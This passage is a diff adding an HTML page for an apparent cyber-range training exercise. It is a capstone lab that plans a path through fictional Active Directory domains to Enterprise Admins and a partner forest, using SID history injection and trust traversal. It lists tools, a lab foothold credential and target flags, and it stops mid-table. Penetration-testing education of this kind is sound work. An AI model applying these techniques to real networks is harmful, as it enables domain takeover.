@@ -1,0 +1,1654 @@
+
+<!doctype html>
+<html lang="en" class="no-js">
+  <head>
+    
+      <meta charset="utf-8">
+      <meta name="viewport" content="width=device-width,initial-scale=1">
+      
+        <meta name="description" content="Linux penetration testing exercises for OpenCyberRange">
+      
+      
+      
+      
+      
+      
+        
+      
+      
+      <link rel="icon" href="../../assets/images/favicon.png">
+      <meta name="generator" content="mkdocs-1.6.1, mkdocs-material-9.7.2">
+    
+    
+      
+        <title>Exercise 6.2: Track Capstone, Multi-Domain (Mini-GOAD) - Linux Penetration Testing</title>
+      
+    
+    
+      <link rel="stylesheet" href="../../assets/stylesheets/main.484c7ddc.min.css">
+      
+        
+        <link rel="stylesheet" href="../../assets/stylesheets/palette.ab4e12ef.min.css">
+      
+      
+
+
+    
+    
+      
+    
+    
+      
+        
+        
+        <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+        <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Inter:300,300i,400,400i,700,700i%7CJetBrains+Mono:400,400i,700,700i&display=fallback">
+        <style>:root{--md-text-font:"Inter";--md-code-font:"JetBrains Mono"}</style>
+      
+    
+    
+      <link rel="stylesheet" href="../../stylesheets/extra.css?v=4">
+    
+    <script>__md_scope=new URL("../..",location),__md_hash=e=>[...e].reduce(((e,_)=>(e<<5)-e+_.charCodeAt(0)),0),__md_get=(e,_=localStorage,t=__md_scope)=>JSON.parse(_.getItem(t.pathname+"."+e)),__md_set=(e,_,t=localStorage,a=__md_scope)=>{try{t.setItem(a.pathname+"."+e,JSON.stringify(_))}catch(e){}}</script>
+    
+      
+
+    
+    
+  </head>
+  
+  
+    
+    
+      
+    
+    
+    
+    
+    <body dir="ltr" data-md-color-scheme="slate" data-md-color-primary="green" data-md-color-accent="light-green">
+  
+    
+    <input class="md-toggle" data-md-toggle="drawer" type="checkbox" id="__drawer" autocomplete="off">
+    <input class="md-toggle" data-md-toggle="search" type="checkbox" id="__search" autocomplete="off">
+    <label class="md-overlay" for="__drawer"></label>
+    <div data-md-component="skip">
+      
+        
+        <a href="#exercise-62-track-capstone-multi-domain-mini-goad" class="md-skip">
+          Skip to content
+        </a>
+      
+    </div>
+    <div data-md-component="announce">
+      
+    </div>
+    
+    
+      
+
+  
+
+<header class="md-header md-header--shadow" data-md-component="header">
+  <nav class="md-header__inner md-grid" aria-label="Header">
+    <a href="../.." title="Linux Penetration Testing" class="md-header__button md-logo" aria-label="Linux Penetration Testing" data-md-component="logo">
+      
+  
+  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 8a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3 3 3 0 0 0 3 3m0 3.54C9.64 9.35 6.5 8 3 8v11c3.5 0 6.64 1.35 9 3.54 2.36-2.19 5.5-3.54 9-3.54V8c-3.5 0-6.64 1.35-9 3.54"/></svg>
+
+    </a>
+    <label class="md-header__button md-icon" for="__drawer">
+      
+      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M3 6h18v2H3zm0 5h18v2H3zm0 5h18v2H3z"/></svg>
+    </label>
+    <div class="md-header__title" data-md-component="header-title">
+      <div class="md-header__ellipsis">
+        <div class="md-header__topic">
+          <span class="md-ellipsis">
+            Linux Penetration Testing
+          </span>
+        </div>
+        <div class="md-header__topic" data-md-component="header-topic">
+          <span class="md-ellipsis">
+            
+              Exercise 6.2: Track Capstone, Multi-Domain (Mini-GOAD)
+            
+          </span>
+        </div>
+      </div>
+    </div>
+    
+      
+        <form class="md-header__option" data-md-component="palette">
+  
+    
+    
+    
+    <input class="md-option" data-md-color-media="" data-md-color-scheme="slate" data-md-color-primary="green" data-md-color-accent="light-green"  aria-label="Switch to light mode"  type="radio" name="__palette" id="__palette_0">
+    
+      <label class="md-header__button md-icon" title="Switch to light mode" for="__palette_1" hidden>
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 18c-.89 0-1.74-.2-2.5-.55C11.56 16.5 13 14.42 13 12s-1.44-4.5-3.5-5.45C10.26 6.2 11.11 6 12 6a6 6 0 0 1 6 6 6 6 0 0 1-6 6m8-9.31V4h-4.69L12 .69 8.69 4H4v4.69L.69 12 4 15.31V20h4.69L12 23.31 15.31 20H20v-4.69L23.31 12z"/></svg>
+      </label>
+    
+  
+    
+    
+    
+    <input class="md-option" data-md-color-media="" data-md-color-scheme="default" data-md-color-primary="green" data-md-color-accent="light-green"  aria-label="Switch to dark mode"  type="radio" name="__palette" id="__palette_1">
+    
+      <label class="md-header__button md-icon" title="Switch to dark mode" for="__palette_0" hidden>
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 8a4 4 0 0 0-4 4 4 4 0 0 0 4 4 4 4 0 0 0 4-4 4 4 0 0 0-4-4m0 10a6 6 0 0 1-6-6 6 6 0 0 1 6-6 6 6 0 0 1 6 6 6 6 0 0 1-6 6m8-9.31V4h-4.69L12 .69 8.69 4H4v4.69L.69 12 4 15.31V20h4.69L12 23.31 15.31 20H20v-4.69L23.31 12z"/></svg>
+      </label>
+    
+  
+</form>
+      
+    
+    
+      <script>var palette=__md_get("__palette");if(palette&&palette.color){if("(prefers-color-scheme)"===palette.color.media){var media=matchMedia("(prefers-color-scheme: light)"),input=document.querySelector(media.matches?"[data-md-color-media='(prefers-color-scheme: light)']":"[data-md-color-media='(prefers-color-scheme: dark)']");palette.color.media=input.getAttribute("data-md-color-media"),palette.color.scheme=input.getAttribute("data-md-color-scheme"),palette.color.primary=input.getAttribute("data-md-color-primary"),palette.color.accent=input.getAttribute("data-md-color-accent")}for(var[key,value]of Object.entries(palette.color))document.body.setAttribute("data-md-color-"+key,value)}</script>
+    
+    
+    
+      
+      
+        <label class="md-header__button md-icon" for="__search">
+          
+          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.52 6.52 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5"/></svg>
+        </label>
+        <div class="md-search" data-md-component="search" role="dialog">
+  <label class="md-search__overlay" for="__search"></label>
+  <div class="md-search__inner" role="search">
+    <form class="md-search__form" name="search">
+      <input type="text" class="md-search__input" name="query" aria-label="Search" placeholder="Search" autocapitalize="off" autocorrect="off" autocomplete="off" spellcheck="false" data-md-component="search-query" required>
+      <label class="md-search__icon md-icon" for="__search">
+        
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.52 6.52 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5"/></svg>
+        
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11z"/></svg>
+      </label>
+      <nav class="md-search__options" aria-label="Search">
+        
+        <button type="reset" class="md-search__icon md-icon" title="Clear" aria-label="Clear" tabindex="-1">
+          
+          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M19 6.41 17.59 5 12 10.59 6.41 5 5 6.41 10.59 12 5 17.59 6.41 19 12 13.41 17.59 19 19 17.59 13.41 12z"/></svg>
+        </button>
+      </nav>
+      
+    </form>
+    <div class="md-search__output">
+      <div class="md-search__scrollwrap" tabindex="0" data-md-scrollfix>
+        <div class="md-search-result" data-md-component="search-result">
+          <div class="md-search-result__meta">
+            Initializing search
+          </div>
+          <ol class="md-search-result__list" role="presentation"></ol>
+        </div>
+      </div>
+    </div>
+  </div>
+</div>
+      
+    
+    
+  </nav>
+  
+</header>
+    
+    <div class="md-container" data-md-component="container">
+      
+      
+        
+          
+        
+      
+      <main class="md-main" data-md-component="main">
+        <div class="md-main__inner md-grid">
+          
+            
+              
+              <div class="md-sidebar md-sidebar--primary" data-md-component="sidebar" data-md-type="navigation" >
+                <div class="md-sidebar__scrollwrap">
+                  <div class="md-sidebar__inner">
+                    
+
+
+
+<nav class="md-nav md-nav--primary" aria-label="Navigation" data-md-level="0">
+  <label class="md-nav__title" for="__drawer">
+    <a href="../.." title="Linux Penetration Testing" class="md-nav__button md-logo" aria-label="Linux Penetration Testing" data-md-component="logo">
+      
+  
+  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 8a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3 3 3 0 0 0 3 3m0 3.54C9.64 9.35 6.5 8 3 8v11c3.5 0 6.64 1.35 9 3.54 2.36-2.19 5.5-3.54 9-3.54V8c-3.5 0-6.64 1.35-9 3.54"/></svg>
+
+    </a>
+    Linux Penetration Testing
+  </label>
+  
+  <ul class="md-nav__list" data-md-scrollfix>
+    
+      
+      
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../.." class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Home
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    
+    
+    
+    
+      
+        
+        
+      
+    
+    
+    <li class="md-nav__item md-nav__item--section md-nav__item--nested">
+      
+        
+        
+          
+        
+        <input class="md-nav__toggle md-toggle md-toggle--indeterminate" type="checkbox" id="__nav_2" >
+        
+          
+          <label class="md-nav__link" for="__nav_2" id="__nav_2_label" tabindex="">
+            
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    CH L1 -- Linux Service Enumeration
+  
+
+    
+  </span>
+  
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_2_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_2">
+            <span class="md-nav__icon md-icon"></span>
+            
+  
+    CH L1 -- Linux Service Enumeration
+  
+
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../CH_LIN01_Linux_Service_Enumeration/00_Introduction/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Introduction
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../CH_LIN01_Linux_Service_Enumeration/01_SSH_Service_Detection/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Exercise L1.1 -- SSH Service Detection
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../CH_LIN01_Linux_Service_Enumeration/02_Multi_Service_Discovery/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Exercise L1.2 -- Multi-Service Discovery
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../CH_LIN01_Linux_Service_Enumeration/03_Service_Interaction/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Exercise L1.3 -- Service Interaction
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../CH_LIN01_Linux_Service_Enumeration/04_Non_Standard_Port_Discovery/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Exercise L1.4 -- Non-Standard Port Discovery
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../CH_LIN01_Linux_Service_Enumeration/05_NSE_Script_Enumeration/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Exercise L1.5 -- NSE Script Enumeration
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../CH_LIN01_Linux_Service_Enumeration/06_Version_Vulnerability_Identification/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Exercise L1.6 -- Version Vulnerability Identification
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../CH_LIN01_Linux_Service_Enumeration/07_Chapter_Review/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Chapter Review
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    
+    
+    
+    
+      
+        
+        
+      
+    
+    
+    <li class="md-nav__item md-nav__item--section md-nav__item--nested">
+      
+        
+        
+          
+        
+        <input class="md-nav__toggle md-toggle md-toggle--indeterminate" type="checkbox" id="__nav_3" >
+        
+          
+          <label class="md-nav__link" for="__nav_3" id="__nav_3_label" tabindex="">
+            
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    CH L2 -- SSH Authentication
+  
+
+    
+  </span>
+  
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_3_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_3">
+            <span class="md-nav__icon md-icon"></span>
+            
+  
+    CH L2 -- SSH Authentication
+  
+
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../CH_LIN02_SSH_Authentication/00_Introduction/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Introduction
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../CH_LIN02_SSH_Authentication/01_SSH_Basic_Login/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Exercise L2.1 -- SSH Basic Login
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../CH_LIN02_SSH_Authentication/02_SSH_User_Discovery/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Exercise L2.2 -- SSH User Discovery
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../CH_LIN02_SSH_Authentication/03_SSH_File_Discovery/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Exercise L2.3 -- SSH File Discovery
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../CH_LIN02_SSH_Authentication/04_Chapter_Review/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Chapter Review
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    
+    
+    
+    
+      
+        
+        
+      
+    
+    
+    <li class="md-nav__item md-nav__item--section md-nav__item--nested">
+      
+        
+        
+          
+        
+        <input class="md-nav__toggle md-toggle md-toggle--indeterminate" type="checkbox" id="__nav_4" >
+        
+          
+          <label class="md-nav__link" for="__nav_4" id="__nav_4_label" tabindex="">
+            
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    CH L3 -- SSH Post-Exploitation
+  
+
+    
+  </span>
+  
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_4_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_4">
+            <span class="md-nav__icon md-icon"></span>
+            
+  
+    CH L3 -- SSH Post-Exploitation
+  
+
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../CH_LIN03_SSH_Post_Exploitation/00_Introduction/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Introduction
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../CH_LIN03_SSH_Post_Exploitation/01_SSH_Command_Execution/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Exercise L3.1 -- SSH Command Execution
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../CH_LIN03_SSH_Post_Exploitation/02_SSH_History_Analysis/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Exercise L3.2 -- SSH History Analysis
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../CH_LIN03_SSH_Post_Exploitation/03_SSH_Privilege_Escalation/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Exercise L3.3 -- SSH Privilege Escalation
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../CH_LIN03_SSH_Post_Exploitation/04_Chapter_Review/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Chapter Review
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+    
+  </ul>
+</nav>
+                  </div>
+                </div>
+              </div>
+            
+            
+              
+              <div class="md-sidebar md-sidebar--secondary" data-md-component="sidebar" data-md-type="toc" >
+                <div class="md-sidebar__scrollwrap">
+                  <div class="md-sidebar__inner">
+                    
+
+<nav class="md-nav md-nav--secondary" aria-label="Table of contents">
+  
+  
+  
+    
+  
+  
+    <label class="md-nav__title" for="__toc">
+      <span class="md-nav__icon md-icon"></span>
+      Table of contents
+    </label>
+    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#before-you-begin" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Before You Begin
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#scenario" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Scenario
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Scenario">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#trust-topology" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Trust Topology
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#capstone-phase-map" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Capstone Phase Map
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#trust-type-comparison" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Trust Type Comparison
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#recommended-phases" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Recommended Phases
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Recommended Phases">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#phase-0-engagement-setup-target-10-minutes" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Phase 0: Engagement Setup (target: ~10 minutes)
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#phase-1-corp-tier-1-target-120-minutes" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Phase 1: Corp Tier 1 (target: ~120 minutes)
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#phase-2-corp-tier-0-target-180-minutes" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Phase 2: Corp Tier 0 (target: ~180 minutes)
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#phase-3-cross-trust-to-enterprise-admins-target-240-minutes" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Phase 3: Cross-Trust to Enterprise Admins (target: ~240 minutes)
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Phase 3: Cross-Trust to Enterprise Admins (target: ~240 minutes)">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#the-technique-inter-realm-sid-history-injection" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        The technique: Inter-Realm SID History Injection
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#phase-4-external-trust-to-logistics-target-180-minutes" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Phase 4: External Trust to Logistics (target: ~180 minutes)
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Phase 4: External Trust to Logistics (target: ~180 minutes)">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#the-technique-external-trust-traversal" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        The technique: External Trust Traversal
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#reporting-template" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Reporting Template
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#key-takeaways" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Key Takeaways
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#cheat-sheet-recap" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Cheat Sheet Recap
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#reflection-final-track-output" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Reflection (Final Track Output)
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#you-did-it" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        You Did It
+      
+    </span>
+  </a>
+  
+</li>
+      
+    </ul>
+  
+</nav>
+                  </div>
+                </div>
+              </div>
+            
+          
+          
+            <div class="md-content" data-md-component="content">
+              
+              <article class="md-content__inner md-typeset">
+                
+                  
+
+
+
+<h1 id="exercise-62-track-capstone-multi-domain-mini-goad">Exercise 6.2: Track Capstone, Multi-Domain (Mini-GOAD)</h1>
+<h2 id="before-you-begin">Before You Begin</h2>
+<p>The track capstone is the bridge to GOAD. Five VMs, three domains, two trust relationships, four flags. The exercise is the explicit GOAD-Light readiness gate: students who finish this should be able to clone GOAD, drop in unaided, and immediately recognize every misconfiguration. There is no walkthrough. The deliverable is the four flags plus a multi-page engagement narrative.</p>
+<p>You will use everything you learned in Levels 1-5: enumeration, BloodHound, ACL abuse, ADCS, delegation, ticket forging. The new techniques unique to this exercise are <strong>trust traversal</strong>: SID history injection across a parent-child trust, and external trust authentication into a partner forest.</p>
+<p><strong>Tools required:</strong> the entire Kali AD toolkit. <code>Rubeus</code>, <code>mimikatz</code>, <code>impacket</code>, <code>bloodyAD</code>, BloodHound, <code>certipy</code>. Pre-installed.</p>
+<h2 id="scenario">Scenario</h2>
+<p>Priya: "The auditor wants to know what happens if a phishing payload lands at the corp tier. Show me. Specifically: prove you can reach Enterprise Admins in the parent forest, then prove the logistics partner trust is also compromisable from there. I want four flags, one per domain milestone."</p>
+<p><strong>Topology:</strong></p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-0-1" name="__codelineno-0-1" href="#__codelineno-0-1"></a>Forest 1: nordport.local
+<a id="__codelineno-0-2" name="__codelineno-0-2" href="#__codelineno-0-2"></a>   Parent DC:  npdc01.nordport.local            (Enterprise Admins live here)
+<a id="__codelineno-0-3" name="__codelineno-0-3" href="#__codelineno-0-3"></a>   Child DC:   corp-dc01.corp.nordport.local    (foothold starts here)
+<a id="__codelineno-0-4" name="__codelineno-0-4" href="#__codelineno-0-4"></a>   Member:     mfgsql01.corp.nordport.local
+<a id="__codelineno-0-5" name="__codelineno-0-5" href="#__codelineno-0-5"></a>
+<a id="__codelineno-0-6" name="__codelineno-0-6" href="#__codelineno-0-6"></a>Forest 2: logistics.local                       (one-way external trust:
+<a id="__codelineno-0-7" name="__codelineno-0-7" href="#__codelineno-0-7"></a>                                                 logistics trusts nordport)
+<a id="__codelineno-0-8" name="__codelineno-0-8" href="#__codelineno-0-8"></a>   DC:         logdc01.logistics.local
+<a id="__codelineno-0-9" name="__codelineno-0-9" href="#__codelineno-0-9"></a>   Member:     logfs01.logistics.local
+<a id="__codelineno-0-10" name="__codelineno-0-10" href="#__codelineno-0-10"></a>
+<a id="__codelineno-0-11" name="__codelineno-0-11" href="#__codelineno-0-11"></a>Trust relationships:
+<a id="__codelineno-0-12" name="__codelineno-0-12" href="#__codelineno-0-12"></a>  nordport.local &lt;-&gt; corp.nordport.local        Parent-child (transitive, intra-forest)
+<a id="__codelineno-0-13" name="__codelineno-0-13" href="#__codelineno-0-13"></a>  logistics.local --trusts--&gt; nordport.local    One-way external (cross-forest)
+</code></pre></div>
+<p><strong>Flags:</strong></p>
+<table>
+<thead>
+<tr>
+<th>#</th>
+<th>Tier</th>
+<th>File</th>
+<th>Privilege required</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>1</td>
+<td>Corp Tier 1</td>
+<td><code>\\mfgsql01\C$\corp_tier1_&lt;token&gt;.txt</code></td>
+<td>Server admin / DBA</td>
+</tr>
+<tr>
+<td>2</td>
+<td>Corp Tier 0</td>
+<td><code>\\corp-dc01\C$\corp_tier0_&lt;token&gt;.txt</code></td>
+<td>Domain Admin (corp)</td>
+</tr>
+<tr>
+<td>3</td>
+<td>Nordport EA</td>
+<td><code>\\npdc01\C$\np_ea_&lt;token&gt;.txt</code></td>
+<td>Enterprise Admins (parent)</td>
+</tr>
+<tr>
+<td>4</td>
+<td>Logistics</td>
+<td><code>\\logfs01\C$\log_&lt;token&gt;.txt</code></td>
+<td>Privileged user (logistics); final flag</td>
+</tr>
+</tbody>
+</table>
+<p><strong>Time budget:</strong> 8 to 12 hours across multiple sittings.</p>
+<p><strong>Foothold credential:</strong> <code>j.chen / Welcome2026#</code> in <code>corp.nordport.local</code>.</p>
+<h3 id="trust-topology">Trust Topology</h3>
+<p>The diagram below maps the two trusts you will traverse. The arrow direction matters: external trusts are one-way by default, and the SID Filter behavior differs.</p>
+<pre class="mermaid"><code>flowchart TB
+    subgraph Forest1["Forest: nordport.local"]
+        NPDC["npdc01&lt;br/&gt;(Enterprise Admins)"]
+        CDC["corp-dc01&lt;br/&gt;(child DC, Domain Admins)"]
+        MFG["mfgsql01&lt;br/&gt;(member, MSSQL)"]
+        NPDC &lt;-- "parent-child trust&lt;br/&gt;(intra-forest, SID Filtering OFF)" --&gt; CDC
+        CDC --- MFG
+    end
+    subgraph Forest2["Forest: logistics.local"]
+        LDC["logdc01"]
+        LFS["logfs01&lt;br/&gt;(target final flag)"]
+        LDC --- LFS
+    end
+    Forest2 -- "one-way external trust&lt;br/&gt;logistics trusts nordport&lt;br/&gt;(SID Filtering ON by default)" --&gt; Forest1</code></pre>
+<h3 id="capstone-phase-map">Capstone Phase Map</h3>
+<p>The diagram below ties the four phases to the four flags. Use it to remind yourself which DC's krbtgt key you need at which step.</p>
+<pre class="mermaid"><code>flowchart LR
+    P1["Phase 1&lt;br/&gt;Corp Tier 1&lt;br/&gt;(mfgsql01 admin)"]
+    P2["Phase 2&lt;br/&gt;Corp Tier 0&lt;br/&gt;(corp DA + krbtgt)"]
+    P3["Phase 3&lt;br/&gt;Enterprise Admin&lt;br/&gt;(SID history injection)"]
+    P4["Phase 4&lt;br/&gt;Logistics&lt;br/&gt;(referral TGT)"]
+
+    F1["flag 1: corp_tier1"]
+    F2["flag 2: corp_tier0"]
+    F3["flag 3: np_ea"]
+    F4["flag 4: log (final)"]
+
+    P1 --&gt; F1 --&gt; P2
+    P2 --&gt; F2 --&gt; P3
+    P3 --&gt; F3 --&gt; P4
+    P4 --&gt; F4</code></pre>
+<h3 id="trust-type-comparison">Trust Type Comparison</h3>
+<p>The table below tells you what to expect from each trust type when you reach for cross-domain attacks.</p>
+<table>
+<thead>
+<tr>
+<th>Trust type</th>
+<th>Direction</th>
+<th>Transitive?</th>
+<th>SID Filtering default</th>
+<th>Useful attack</th>
